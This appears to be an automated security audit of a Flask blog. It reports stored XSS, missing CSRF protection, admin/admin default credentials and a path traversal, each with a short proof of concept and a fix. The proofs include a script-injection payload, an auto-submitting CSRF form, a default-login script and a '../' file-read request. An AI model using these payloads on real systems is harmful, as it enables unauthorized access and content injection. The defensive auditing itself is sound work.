# Auto Security Analysis of blog.eletrix.fr at 2026-02-23

====

## CRITICAL - Stored Cross-Site Scripting (XSS)
The application uses the `markdown2` library to render blog post content and then uses the `|safe` filter in the Jinja2 template (`html/post.html`). Since `markdown2` does not sanitize HTML by default and the template explicitly trusts the output, an attacker can inject malicious scripts into blog posts. These scripts will execute in the context of any user viewing the post, potentially allowing for session hijacking or unauthorized actions.

PoC
```python
import requests

# Payload to be included in the 'content' field when creating a post
payload = "<script>alert('XSS Vulnerability')</script>"

# Example of creating a post with the payload (requires authentication or CSRF)
# data = {
#     "title": "Malicious Post",
#     "author": "Attacker",
#     "tags": "test",
#     "content": payload
# }
# requests.post("http://<target>/create_post", data=data)
```

Fix
Use a sanitization library like `bleach` to clean the HTML output from `markdown2` before passing it to the template, and remove the `|safe` filter or ensure only sanitized HTML is marked as safe.

====

## MEDIUM - Missing CSRF Protection
The application lacks Cross-Site Request Forgery (CSRF) protection on critical state-changing routes, including `/login`, `/create_post`, and `/upload`. An attacker can trick an authenticated administrator into performing unintended actions, such as creating malicious blog posts or uploading files, by making them visit a specially crafted website.

PoC
```html
<!-- Malicious website that creates a blog post if the admin is logged in -->
<form action="http://<target>/create_post" method="POST" id="csrf-form">
    <input type="hidden" name="title" value="CSRF Post" />
    <input type="hidden" name="author" value="Attacker" />
    <input type="hidden" name="tags" value="csrf" />
    <input type="hidden" name="content" value="This post was created via CSRF" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

Fix
Implement CSRF protection by using a library like `Flask-WTF` which provides CSRF tokens for forms, or by manually implementing token validation for all POST requests.

====

## MEDIUM - Insecure Default Credentials
The application defines default administrator credentials (`admin`/`admin`) in `utils.py` if environment variables are not provided. If the application is deployed without overriding these defaults, anyone can gain administrative access to the blog.

PoC
```python
import requests

url = "http://<target>/login"
data = {"username": "admin", "password": "admin"}
response = requests.post(url, data=data, allow_redirects=False)

if response.status_code == 302:
    print("Successfully logged in with default credentials")
```

Fix
Remove hardcoded default credentials from the source code. Require administrators to set strong credentials via environment variables and ensure the application fails to start or forces a password change if they are not set.

====

## LOW - Path Traversal
The `/post/<name>` route in `routes/post.py` is vulnerable to path traversal because it joins the `POSTS_DIR` with a user-supplied `name` without sufficient validation. While the application appends `.md` to the path, an attacker can use `..` to navigate up the directory tree and read any file on the system that ends with the `.md` extension.

PoC
```python
import requests

# This will attempt to read the README.md file in the repository root
url = "http://<target>/post/../README"
response = requests.get(url)
print(response.text)
```

Fix
Sanitize the `name` parameter using `werkzeug.utils.secure_filename` or verify that the resulting absolute path stays within the `POSTS_DIR`.

====

## Summary of Vulnerabilities

| Severity | Exploit Name |
| :--- | :--- |
| CRITICAL | Stored Cross-Site Scripting (XSS) |
| MEDIUM | Missing CSRF Protection |
| MEDIUM | Insecure Default Credentials |
| LOW | Path Traversal |
